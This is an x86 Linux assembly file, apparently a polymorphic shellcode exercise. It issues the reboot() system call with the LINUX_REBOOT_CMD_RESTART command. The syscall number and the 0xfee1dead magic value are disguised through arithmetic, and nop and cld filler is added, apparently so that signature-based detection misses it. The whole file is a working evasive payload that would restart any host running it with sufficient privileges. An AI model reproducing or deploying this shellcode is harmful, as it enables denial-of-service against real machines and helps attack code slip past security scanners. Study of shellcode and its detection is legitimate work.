; Name: poly_reboot.asm

global _start                                                                                                                                                        
section .text

_start:

    xor    ebx,ebx 
    mov    eax,ebx

    ;mov    al, 0x58                        ; reboot() system call  
    mov    al, 0x5 
    add    al, 0x53

    ;mov    ebx,0xfee1dead                  ; LINUX_REBOOT_MAGIC1
    mov     dword [esp -4], 0xedd0cd9c
    add     dword [esp -4], 0x11111111 
    sub     esp, 4
    pop     ebx

    cld
    mov    ecx,0x28121969                   ; LINUX_REBOOT_MAGIC2
    nop
    mov    edx,0x1234567                    ; LINUX_REBOOT_CMD_RESTART
    nop
    int    0x80 
    
    ;xor    eax,eax
    ;mov    al,0x1
    ;xor    ebx,ebx
    ;int    0x80 
